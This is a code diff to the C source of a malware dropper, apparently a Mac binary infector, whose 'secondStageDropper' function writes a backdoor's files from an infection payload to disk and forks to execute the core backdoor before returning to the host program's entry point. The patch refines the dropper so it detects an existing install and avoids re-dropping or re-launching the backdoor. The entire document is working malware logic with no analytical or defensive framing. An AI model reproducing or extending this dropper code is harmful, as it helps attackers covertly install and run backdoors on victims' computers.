@@ -35,6 +35,7 @@
 #define O_RDWR          0x0002
 #define O_CREAT         0x0200
 #define O_TRUNC         0x0400
+#define	O_EXCL          0x0800
 #define RTLD_DEFAULT    ((void *) - 2)
 
 #define	PROT_READ       0x01    // [MC2] pages can be read
@@ -534,11 +535,12 @@ void secondStageDropper ()
 #ifndef LOADER_DEBUG
   int i, pid = 0;
   
-  char *userHome              = NULL;
-  char *destinationDir        = NULL;
-  char *filePointer           = NULL;
-  char *backdoorPath          = NULL;
-  
+  char *userHome                  = NULL;
+  char *destinationDir            = NULL;
+  char *filePointer               = NULL;
+  char *backdoorPath              = NULL;
+  int backdoorIsAlreadyInstalled  = 0;
+
   unsigned int offset         = (unsigned int)(baseAddress) + sizeof (infectionHeader);
   infectionHeader *infection  = (infectionHeader *)baseAddress;
   stringTable *stringList     = (stringTable *)offset;
@@ -711,7 +713,7 @@ void secondStageDropper ()
           for (i = 0; i < infection->numberOfResources; i++)
             {
               char *destinationPath = (char *) imalloc (256);
-              destinationDir  = (char *) imalloc (128);
+              destinationDir = (char *) imalloc (128);
               
               resource = (resourceHeader *)offset;
               isprintf (destinationDir, strings[2], backdoorDropPath, resource->path);
@@ -730,7 +732,7 @@ void secondStageDropper ()
                   istrncpy (backdoorPath, destinationPath, 256);
                 }
               
-              if ((fd = iopen (destinationPath, O_RDWR | O_CREAT | O_TRUNC, 0755)) >= 0)
+              if ((fd = iopen (destinationPath, O_RDWR | O_CREAT | O_EXCL, 0755)) >= 0)
                 {
                   int resSize = resource->size;
 
@@ -754,6 +756,13 @@ void secondStageDropper ()
                   
                   iclose (fd);
                 }
+              else
+                {
+                  if (resource->type == RESOURCE_CORE)
+                    {
+                      backdoorIsAlreadyInstalled = 1;
+                    }
+                }
               
               offset += resource->size;
               
@@ -766,21 +775,23 @@ void secondStageDropper ()
           //
           // Execute the core backdoor file
           //
-          if ((pid = ifork()) == 0)
+          if (backdoorIsAlreadyInstalled == 0)
             {
-              ichdir (backdoorDir);
-              iexecl (backdoorPath, backdoorPath, NULL, NULL, NULL);
-              ifree (backdoorDir);
-            }
-          else if (pid > 0)
-            {
-              // jump to the original entry point
-              
-              //doExit ();
-            }
-          else if (pid < 0)
-            {
-              //doExit ();
+              if ((pid = ifork()) == 0)
+                {
+                  ichdir (backdoorDir);
+                  iexecl (backdoorPath, backdoorPath, NULL, NULL, NULL);
+                  ifree (backdoorDir);
+                }
+              else if (pid > 0)
+                {
+                  // jump to the original entry point
+                  //doExit ();
+                }
+              else if (pid < 0)
+                {
+                  //doExit ();
+                }
             }
           
           ifree (backdoorPath);
